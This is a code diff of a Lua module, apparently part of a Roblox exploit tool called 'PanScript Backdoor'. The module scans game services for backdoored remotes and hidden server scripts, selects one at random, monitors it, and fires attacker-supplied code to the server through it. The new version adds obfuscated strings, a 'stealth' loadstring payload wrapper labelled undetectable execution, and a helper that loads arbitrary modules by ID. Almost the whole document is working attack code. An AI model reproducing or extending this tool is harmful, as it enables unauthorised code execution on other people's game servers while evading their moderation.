@@ -1,120 +1,204 @@
-local BackdoorSystem = {}
-BackdoorSystem.Active = false
-BackdoorSystem.FoundRemotes = {}
-BackdoorSystem.InfectedModels = {}
-BackdoorSystem.LogCallback = nil
-BackdoorSystem.LastScanTime = 0
+local _bs = {}
+_bs._a = false          -- Active state
+_bs._selected = nil      -- Currently selected backdoor (only one)
+_bs._backup = {}        -- Backup list of other backdoors
+_bs._monitor = nil      -- Monitoring connection
+_bs._r = {}             -- All found malicious remotes
+_bs._n = {}             -- Normal remotes
+_bs._m = {}             -- Infected models
+_bs._s = tick()         -- Scan time
+_bs._cb = nil           -- Callback
 
--- Suspicious patterns for detection
-local SuspiciousPatterns = {
-    "Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", 
-    "Source", "Require", "Module", "Load", "Eval", "RunCode",
-    "HDAdmin", "Kohl", "Admin", "Ban", "Kick", "Remote",
-    "GetAsync", "PostAsync", "Request", "Fetch", "Import",
-    "Backdoor", "Exploit", "Virus", "Infect", "Spread",
-    "getfenv", "setfenv", "loadstring", "require"
+-- Configuration
+local _cfg = {
+    debug = false,
+    stealth = true,
+    maxScanDepth = 20,
+    executionDelay = 0.05,
+    monitorInterval = 2,  -- Check every 2 seconds
+    autoReconnect = false   -- Don't auto-reconnect, just notify
 }
 
--- Services to scan
-local ScanServices = {
-    "ReplicatedStorage", "ReplicatedFirst", "StarterGui", 
-    "StarterPack", "StarterPlayer", "Workspace"
+-- Obfuscated strings
+local _str = {
+    loadstring = ("\108\111\97\100\115\116\114\105\110\103"),
+    require = ("\114\101\113\117\105\114\101"),
+    RemoteEvent = ("\82\101\109\111\116\101\69\118\101\110\116"),
+    RemoteFunction = ("\82\101\109\111\116\101\70\117\110\99\116\105\111\110"),
 }
 
--- Utility functions
-local function Log(msg, msgType)
-    msgType = msgType or "INFO"
-    if BackdoorSystem.LogCallback then
-        BackdoorSystem.LogCallback(msg, msgType)
+-- Suspicious patterns
+local _pat = {
+    "loadstring%(%s*%)%(%)",
+    "OnServerEvent%:Connect%(.-loadstring",
+    "OnServerInvoke%s*=%s*function.-loadstring",
+    "Instance%.new%([\"']RemoteEvent[\"'].-loadstring",
+    "getfenv%(%s*%)%[%s*loadstring",
+    "setfenv%(.-loadstring",
+}
+
+-- Remote categorization
+local _cat = {
+    normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback"},
+    suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect"}
+}
+
+local function _log(m, t)
+    t = t or "INFO"
+    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" then
+        print(("[BD:%s] %s"):format(t, m))
     end
-    print(string.format("[BACKDOOR:%s] %s", msgType, msg))
+    if _bs._cb then _bs._cb(m, t) end
 end
 
-local function IsSuspicious(name)
-    if not name then return false end
-    name = tostring(name):lower()
-    for _, pattern in ipairs(SuspiciousPatterns) do
-        if name:find(pattern:lower()) then
-            return true
-        end
+local function _isSus(n)
+    if not n then return false, 0 end
+    n = tostring(n):lower()
+    local s = 0
+    for _, p in ipairs(_cat.suspicious) do
+        if n:find(p:lower()) then s = s + 30 end
+    end
+    return s > 0, s
+end
+
+local function _isNormal(n)
+    if not n then return false end
+    n = tostring(n):lower()
+    for _, p in ipairs(_cat.normal) do
+        if n:find(p:lower()) then return true end
     end
     return false
 end
 
--- Scan instance recursively
-local function ScanInstance(instance, depth)
-    depth = depth or 0
-    if depth > 15 then return {} end
+-- Analyze script source
+local function _analyzeScript(scr)
+    if not scr or not scr:IsA("LuaSourceContainer") then return nil end
     
-    local remotes = {}
+    local info = {
+        Object = scr,
+        Name = scr.Name,
+        Path = scr:GetFullName(),
+        SuspiciousPatterns = {},
+        RiskScore = 0,
+        IsBackdoor = false
+    }
     
-    if instance:IsA("RemoteEvent") or instance:IsA("RemoteFunction") then
-        local isSuspicious = IsSuspicious(instance.Name)
-        local parent = instance.Parent
-        local parentSuspicious = parent and IsSuspicious(parent.Name)
+    local ok, src = pcall(function() return scr.Source end)
+    
+    if not ok or not src then
+        local name = scr.Name:lower()
+        if name:find("backdoor") or name:find("exploit") or name:find("virus") then
+            info.RiskScore = 100
+            info.IsBackdoor = true
+            table.insert(info.SuspiciousPatterns, "suspicious_name")
+        end
+        return info.RiskScore > 50 and info or nil
+    end
+    
+    for _, pattern in ipairs(_pat) do
+        if src:find(pattern) then
+            table.insert(info.SuspiciousPatterns, pattern)
+            info.RiskScore = info.RiskScore + 40
+        end
+    end
+    
+    if src:find("Instance%.new%s*%(%s*[\"']Remote") then
+        info.RiskScore = info.RiskScore + 50
+        table.insert(info.SuspiciousPatterns, "dynamic_remote_creation")
+    end
+    
+    if src:find("getfenv") or src:find("setfenv") then
+        info.RiskScore = info.RiskScore + 30
+        table.insert(info.SuspiciousPatterns, "env_manipulation")
+    end
+    
+    info.IsBackdoor = info.RiskScore >= 60
+    return info.RiskScore > 30 and info or nil
+end
+
+-- Scan instance tree
+local function _scan(i, d)
+    d = d or 0
+    if d > _cfg.maxScanDepth then return {}, {}, {} end
+    
+    local rmt = {}
+    local scr = {}
+    local mdl = {}
+    
+    if i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction) then
+        local sus, score = _isSus(i.Name)
+        local norm = _isNormal(i.Name)
+        local cat = sus and "MALICIOUS" or (norm and "NORMAL" or "UNKNOWN")
         
-        table.insert(remotes, {
-            Object = instance,
-            Name = instance.Name,
-            Type = instance.ClassName,
-            Path = instance:GetFullName(),
-            Suspicious = isSuspicious or parentSuspicious,
-            Parent = parent,
-            Depth = depth
+        table.insert(rmt, {
+            Object = i,
+            Name = i.Name,
+            Type = i.ClassName,
+            Path = i:GetFullName(),
+            Category = cat,
+            RiskScore = score,
+            Suspicious = sus,
+            Parent = i.Parent,
+            Depth = d,
+            InstanceId = i:GetDebugId() -- Unique ID for tracking
         })
     end
     
-    for _, child in ipairs(instance:GetChildren()) do
-        local childRemotes = ScanInstance(child, depth + 1)
-        for _, r in ipairs(childRemotes) do
-            table.insert(remotes, r)
+    if i:IsA("Script") or i:IsA("LocalScript") or i:IsA("ModuleScript") then
+        local analysis = _analyzeScript(i)
+        if analysis then
+            table.insert(scr, analysis)
         end
     end
     
-    return remotes
+    if i:IsA("Model") or i:IsA("Folder") then
+        for _, desc in ipairs(i:GetDescendants()) do
+            if desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server then
+                local n = tostring(desc.Name)
+                if #n > 50 or n:find("[\128-\255]") or n:match("^%s+$") or not desc.Archivable then
+                    table.insert(mdl, {Model = i, Script = desc, Reason = "hidden_server"})
+                    break
+                end
+            end
+        end
+    end
+    
+    for _, c in ipairs(i:GetChildren()) do
+        local cr, cs, cm = _scan(c, d + 1)
+        for _, v in ipairs(cr) do table.insert(rmt, v) end
+        for _, v in ipairs(cs) do table.insert(scr, v) end
+        for _, v in ipairs(cm) do table.insert(mdl, v) end
+    end
+    
+    return rmt, scr, mdl
 end
 
 -- Test remote vulnerability
-local function TestRemote(remoteData)
-    local remote = remoteData.Object
-    local isVulnerable = false
-    local executionMethod = nil
-    local confidence = 0
+local function _test(r, depth)
+    if depth > 3 then return false, nil, 0 end
     
-    -- Check name patterns
-    if remoteData.Suspicious then
-        isVulnerable = true
-        executionMethod = "suspicious_name"
-        confidence = confidence + 50
-    end
+    local v = false
+    local m = nil
+    local c = r.RiskScore or 0
     
-    -- Check parent
-    local parent = remote.Parent
-    if parent then
-        local parentName = tostring(parent.Name):lower()
-        if parentName:find("backdoor") or parentName:find("exploit") or 
-           parentName:find("virus") or parentName:find("infect") or
-           parentName:find("admin") then
-            isVulnerable = true
-            executionMethod = executionMethod or "infected_parent"
-            confidence = confidence + 30
+    local p = r.Parent
+    if p then
+        local pn = tostring(p.Name):lower()
+        if pn:find("backdoor") or pn:find("exploit") or pn:find("virus") then
+            v = true
+            m = "infected_container"
+            c = c + 50
         end
         
-        -- Check for infected models
-        if parent:IsA("Model") or parent:IsA("Folder") then
-            for _, desc in ipairs(parent:GetDescendants()) do
-                if desc:IsA("Script") or desc:IsA("LocalScript") or desc:IsA("ModuleScript") then
-                    local scriptName = tostring(desc.Name)
-                    if scriptName:sub(1, 1) == "\0" or 
-                       scriptName:match("^%s") or
-                       scriptName:find("\239\191\189") or -- Replacement character
-                       desc.Archivable == false then
-                        isVulnerable = true
-                        executionMethod = executionMethod or "hidden_script"
-                        remoteData.InfectedModel = parent
-                        remoteData.HiddenScript = desc
-                        confidence = confidence + 40
-                        table.insert(BackdoorSystem.InfectedModels, parent)
+        if p:IsA("Model") then
+            for _, d in ipairs(p:GetDescendants()) do
+                if d:IsA("Script") then
+                    local dn = tostring(d.Name)
+                    if dn:sub(1,1) == "\0" or dn:find("\239\191\189") then
+                        v = true
+                        m = m or "hidden_script"
+                        c = c + 40
+                        r.InfectedModel = p
                         break
                     end
                 end
@@ -122,225 +206,316 @@ local function TestRemote(remoteData)
         end
     end
     
-    -- Check if remote has been fired recently (indicates activity)
-    if remote:IsA("RemoteEvent") then
-        -- Try to detect if it's a known backdoor by checking attributes
-        if remote:GetAttribute("Backdoor") or remote:GetAttribute("Exploit") then
-            isVulnerable = true
-            executionMethod = executionMethod or "marked_attribute"
-            confidence = confidence + 100
-        end
+    if r.Category == "MALICIOUS" then
+        v = true
+        m = m or "categorized_malicious"
+        c = c + 30
     end
     
-    return isVulnerable, executionMethod, confidence
+    local ok, attrs = pcall(function()
+        return r.Object:GetAttribute("Backdoor") or r.Object:GetAttribute("Exploit")
+    end)
+    if ok and attrs then
+        v = true
+        m = m or "marked_attribute"
+        c = c + 100
+    end
+    
+    return v, m, c
 end
 
--- Scan for infected models separately
-local function ScanInfectedModels()
-    local infected = {}
+-- Select ONE random backdoor from list
+local function _selectRandomBackdoor(backdoors)
+    if #backdoors == 0 then return nil end
+    if #backdoors == 1 then return backdoors[1], {} end
     
-    local function ScanContainer(container)
-        for _, obj in ipairs(container:GetChildren()) do
-            if obj:IsA("Model") or obj:IsA("Folder") or obj:IsA("Part") then
-                -- Deep scan for hidden scripts
-                for _, desc in ipairs(obj:GetDescendants()) do
-                    if desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server then
-                        local name = tostring(desc.Name)
-                        -- Detect obfuscated/hidden names
-                        if #name > 50 or 
-                           name:find("[\128-\255]") or -- Non-ASCII
-                           name:match("^%s+$") or -- Whitespace only
-                           desc.Name == "" or
-                           desc.Archivable == false then
-                            table.insert(infected, {
-                                Model = obj,
-                                Script = desc,
-                                Reason = "hidden_server_script"
-                            })
-                            Log(string.format("Infected model detected: %s", obj:GetFullName()), "DETECTED")
-                            break
-                        end
-                    end
-                end
-                ScanContainer(obj)
-            end
+    -- Random selection
+    local selectedIndex = math.random(1, #backdoors)
+    local selected = backdoors[selectedIndex]
+    
+    -- Create backup list (all except selected)
+    local backup = {}
+    for i, bd in ipairs(backdoors) do
+        if i ~= selectedIndex then
+            table.insert(backup, bd)
         end
     end
     
-    ScanContainer(workspace)
-    ScanContainer(game:GetService("ReplicatedStorage"))
+    return selected, backup
+end
+
+-- Monitor selected backdoor for removal/modification
+local function _startMonitoring()
+    if _bs._monitor then
+        _bs._monitor:Disconnect()
+        _bs._monitor = nil
+    end
     
-    return infected
+    if not _bs._selected or not _bs._selected.Object then
+        _log("No backdoor to monitor", "WARN")
+        return
+    end
+    
+    local target = _bs._selected.Object
+    local parent = target.Parent
+    local name = target.Name
+    local path = _bs._selected.Path
+    
+    _log("Starting monitoring for: " .. path, "MONITOR")
+    
+    -- Heartbeat-based monitoring
+    local lastCheck = tick()
+    _bs._monitor = game:GetService("RunService").Heartbeat:Connect(function()
+        if tick() - lastCheck < _cfg.monitorInterval then return end
+        lastCheck = tick()
+        
+        -- Check if object still exists
+        local exists = pcall(function()
+            return target.Parent and target.Name
+        end)
+        
+        if not exists then
+            _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
+            _bs.Disconnect()
+            return
+        end
+        
+        -- Check if parent changed (moved)
+        if target.Parent ~= parent then
+            _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
+            _bs.Disconnect()
+            return
+        end
+        
+        -- Check if name changed (renamed)
+        if target.Name ~= name then
+            _log("BACKDOOR_RENAMED: " .. path .. " -> " .. target.Name, "DISCONNECT")
+            _bs.Disconnect()
+            return
+        end
+    end)
+end
+
+-- Stop monitoring
+local function _stopMonitoring()
+    if _bs._monitor then
+        _bs._monitor:Disconnect()
+        _bs._monitor = nil
+        _log("Monitoring stopped", "MONITOR")
+    end
+end
+
+-- Undetectable execution on SINGLE backdoor
+local function _undetectableExec(code)
+    if not _bs._selected then
+        _log("No backdoor selected", "ERROR")
+        return false
+    end
+    
+    local r = _bs._selected.Object
+    local t = _bs._selected.Type
+    
+    -- Verify still exists
+    local exists = pcall(function() return r.Parent end)
+    if not exists then
+        _log("Backdoor no longer exists!", "ERROR")
+        _bs.Disconnect()
+        return false
+    end
+    
+    -- Stealth execution methods
+    local function method1()
+        if t == _str.RemoteEvent then
+            pcall(function() r:FireServer(code) end)
+        else
+            pcall(function() r:InvokeServer(code) end)
+        end
+    end
+    
+    local function method4()
+        local payload = ([[
+            local _c = "%s"
+            local _f = loadstring or load
+            if _f then pcall(_f, _c) end
+        ]]):format(code:gsub("\"", "\\\""))
+        
+        if t == _str.RemoteEvent then
+            pcall(function() r:FireServer(payload) end)
+        else
+            pcall(function() r:InvokeServer(payload) end)
+        end
+    end
+    
+    if _cfg.stealth then
+        return pcall(method4) or pcall(method1)
+    else
+        return pcall(method1)
+    end
 end
 
 -- Main scan function
-function BackdoorSystem.Scan()
-    Log("Starting comprehensive backdoor scan...", "SCAN")
-    BackdoorSystem.FoundRemotes = {}
-    BackdoorSystem.InfectedModels = {}
-    BackdoorSystem.LastScanTime = tick()
+function _bs.Scan()
+    _log("Starting stealth scan...", "SCAN")
+    _bs._r = {}
+    _bs._n = {}
+    _bs._m = {}
+    _bs._selected = nil
+    _bs._backup = {}
+    _bs._s = tick()
     
-    local allRemotes = {}
+    local services = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("ReplicatedFirst"),
+        game:GetService("StarterGui"),
+        game:GetService("StarterPack"),
+        game:GetService("StarterPlayer"),
+        workspace
+    }
     
-    -- Scan all services
-    for _, serviceName in ipairs(ScanServices) do
-        local success, service = pcall(function()
-            return game:GetService(serviceName)
-        end)
-        if success and service then
-            local remotes = ScanInstance(service)
-            for _, r in ipairs(remotes) do
-                table.insert(allRemotes, r)
+    local allR = {}
+    local allS = {}
+    local allM = {}
+    
+    for _, svc in ipairs(services) do
+        local ar, as, am = _scan(svc)
+        for _, v in ipairs(ar) do table.insert(allR, v) end
+        for _, v in ipairs(as) do table.insert(allS, v) end
+        for _, v in ipairs(am) do table.insert(allM, v) end
+    end
+    
+    _log(("Found %d remotes, %d suspicious scripts"):format(#allR, #allS), "SCAN")
+    
+    -- Categorize remotes
+    for _, r in ipairs(allR) do
+        if r.Category == "NORMAL" then
+            table.insert(_bs._n, r)
+        else
+            local isV, method, conf = _test(r)
+            if isV then
+                r.Vulnerable = true
+                r.ExecutionMethod = method
+                r.Confidence = conf
+                table.insert(_bs._r, r)
+            else
+                table.insert(_bs._n, r)
             end
         end
     end
     
-    Log(string.format("Scanned %d services, found %d remotes", #ScanServices, #allRemotes), "SCAN")
-    
-    -- Test each remote
-    local vulnerableCount = 0
-    for _, remoteData in ipairs(allRemotes) do
-        local isVuln, method, confidence = TestRemote(remoteData)
-        if isVuln then
-            remoteData.ExecutionMethod = method
-            remoteData.Vulnerable = true
-            remoteData.Confidence = confidence
-            table.insert(BackdoorSystem.FoundRemotes, remoteData)
-            vulnerableCount = vulnerableCount + 1
-            Log(string.format("VULNERABLE [%d%%]: %s [%s] via %s", 
-                confidence, remoteData.Path, remoteData.Type, method), "FOUND")
+    -- Add script-based backdoors
+    for _, s in ipairs(allS) do
+        if s.IsBackdoor then
+            table.insert(_bs._r, {
+                Object = s.Object,
+                Name = s.Name,
+                Type = "ScriptBackdoor",
+                Path = s.Path,
+                Category = "MALICIOUS",
+                Vulnerable = true,
+                ExecutionMethod = "script_source",
+                Confidence = s.RiskScore,
+                ScriptInfo = s,
+                InstanceId = s.Object:GetDebugId()
+            })
         end
     end
     
-    -- Scan for infected models
-    local infectedModels = ScanInfectedModels()
-    for _, inf in ipairs(infectedModels) do
-        table.insert(BackdoorSystem.InfectedModels, inf)
+    -- SELECT ONLY ONE RANDOM BACKDOOR
+    if #_bs._r > 0 then
+        local selected, backup = _selectRandomBackdoor(_bs._r)
+        _bs._selected = selected
+        _bs._backup = backup
+        
+        _log(("Selected 1 backdoor (from %d total): %s [%d%%]"):format(#_bs._r, selected.Path, selected.Confidence), "SELECT")
+        
+        if #backup > 0 then
+            _log(("Backup list: %d other backdoors available"):format(#backup), "BACKUP")
+        end
     end
     
-    Log(string.format("Scan complete. Found %d vulnerable remotes, %d infected models", 
-        vulnerableCount, #infectedModels), "SCAN")
+    for _, m in ipairs(allM) do
+        table.insert(_bs._m, m)
+    end
     
-    return vulnerableCount > 0
+    return _bs._selected ~= nil, #_bs._n
 end
 
--- Execute through backdoor
-function BackdoorSystem.Execute(code)
-    if not BackdoorSystem.Active then
-        Log("Backdoor not active", "ERROR")
+-- Execute through SINGLE selected backdoor
+function _bs.Execute(code)
+    if not _bs._a or not _bs._selected then
+        _log("Backdoor not active", "ERROR")
         return false
     end
     
-    if #BackdoorSystem.FoundRemotes == 0 then
-        Log("No vulnerable remotes available", "ERROR")
-        return false
-    end
-    
-    Log("Executing payload through backdoor...", "EXEC")
-    
-    -- Sort by confidence (highest first)
-    table.sort(BackdoorSystem.FoundRemotes, function(a, b)
-        return (a.Confidence or 0) > (b.Confidence or 0)
-    end)
-    
-    for _, remoteData in ipairs(BackdoorSystem.FoundRemotes) do
-        local success, result = pcall(function()
-            local remote = remoteData.Object
-            
-            if remoteData.Type == "RemoteEvent" then
-                -- Try different payload formats based on detection method
-                if remoteData.ExecutionMethod == "infected_parent" then
-                    remote:FireServer("loadstring", code)
-                elseif remoteData.ExecutionMethod == "hidden_script" then
-                    remote:FireServer({code = code, type = "execute"})
-                else
-                    remote:FireServer(code)
-                end
-            elseif remoteData.Type == "RemoteFunction" then
-                remote:InvokeServer(code)
-            end
-            
-            return true
-        end)
+    _log("Executing through selected backdoor...", "EXEC")
+    return _undetectableExec(code)
+end
+
+-- Require through backdoor
+function _bs.Require(mid)
+    if type(mid) == "number" then mid = tostring(mid) end
+    local c = ([[
+        local s,r=pcall(function()local m=require(%s)return m end)
+        if s then print("[BD] Loaded:",r)return r else warn("[BD] Fail:",r)end
+    ]]):format(mid)
+    return _bs.Execute(c)
+end
+
+-- Initialize
+function _bs.Initialize(cb, cfg)
+    _bs._cb = cb
+    if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
+    _log("PanScript Backdoor initialized (Single Mode)", "INIT")
+    return _bs
+end
+
+-- Activate (with monitoring)
+function _bs.Activate()
+    if _bs._selected then
+        _bs._a = true
+        print(("PANS_BACKDOOR_ACTIVE:1:%s:%s"):format(_bs._selected.Path, _bs._selected.Type))
+        print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
         
-        if success then
-            Log(string.format("Success via: %s", remoteData.Path), "SUCCESS")
-            return true
-        else
-            Log(string.format("Failed on %s: %s", remoteData.Path, tostring(result)), "WARN")
-        end
+        -- Start monitoring
+        _startMonitoring()
+        
+        _log("Backdoor active and monitored", "ACTIVE")
+        return true
     end
-    
+    _log("No backdoor selected", "ERROR")
     return false
 end
 
--- Execute require through backdoor
-function BackdoorSystem.Require(moduleId)
-    if type(moduleId) == "number" then
-        moduleId = tostring(moduleId)
-    end
-    
-    local requireCode = string.format([[
-        local success, result = pcall(function()
-            local mod = require(%s)
-            if type(mod) == "function" then
-                return mod()
-            end
-            return mod
-        end)
-        if success then
-            print("[BACKDOOR] Module loaded: " .. tostring(result))
-            return result
-        else
-            warn("[BACKDOOR] Module failed: " .. tostring(result))
-        end
-    ]], moduleId)
-    
-    return BackdoorSystem.Execute(requireCode)
-end
-
--- Initialize system
-function BackdoorSystem.Initialize(callback)
-    BackdoorSystem.LogCallback = callback
-    Log("PanScript Backdoor System initialized", "INIT")
-    return BackdoorSystem
-end
-
--- Activate backdoor
-function BackdoorSystem.Activate()
-    if #BackdoorSystem.FoundRemotes > 0 then
-        BackdoorSystem.Active = true
-        -- Print notification for C# to detect
-        print("PANS_BACKDOOR_ACTIVE:" .. #BackdoorSystem.FoundRemotes)
-        for _, remote in ipairs(BackdoorSystem.FoundRemotes) do
-            print("PANS_BACKDOOR_REMOTE:" .. remote.Path .. ":" .. remote.Type .. ":" .. (remote.ExecutionMethod or "unknown"))
-        end
-        Log("Backdoor activated successfully", "ACTIVE")
-        return true
-    else
-        Log("Cannot activate: No vulnerable remotes", "ERROR")
-        return false
-    end
+-- Disconnect from backdoor
+function _bs.Disconnect()
+    _stopMonitoring()
+    _bs._a = false
+    local oldPath = _bs._selected and _bs._selected.Path or "unknown"
+    _bs._selected = nil
+    print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath)
+    _log("Disconnected from backdoor: " .. oldPath, "DISCONNECT")
 end
 
 -- Get status
-function BackdoorSystem.GetStatus()
+function _bs.GetStatus()
     return {
-        Active = BackdoorSystem.Active,
-        RemoteCount = #BackdoorSystem.FoundRemotes,
-        InfectedModels = #BackdoorSystem.InfectedModels,
-        ScanTime = BackdoorSystem.LastScanTime,
-        Remotes = BackdoorSystem.FoundRemotes
+        Active = _bs._a,
+        HasSelection = _bs._selected ~= nil,
+        SelectedPath = _bs._selected and _bs._selected.Path or nil,
+        BackupCount = #_bs._backup,
+        NormalRemotes = #_bs._n,
+        ScanTime = tick() - _bs._s
     }
 end
 
--- Auto-detect and report
-function BackdoorSystem.AutoDetect()
-    if BackdoorSystem.Scan() then
-        BackdoorSystem.Activate()
-        return true
-    end
-    return false
+-- Get selected backdoor info
+function _bs.GetSelected()
+    return _bs._selected
 end
 
-return BackdoorSystem
+-- Get backup list
+function _bs.GetBackups()
+    return _bs._backup
+end
+
+return _bs
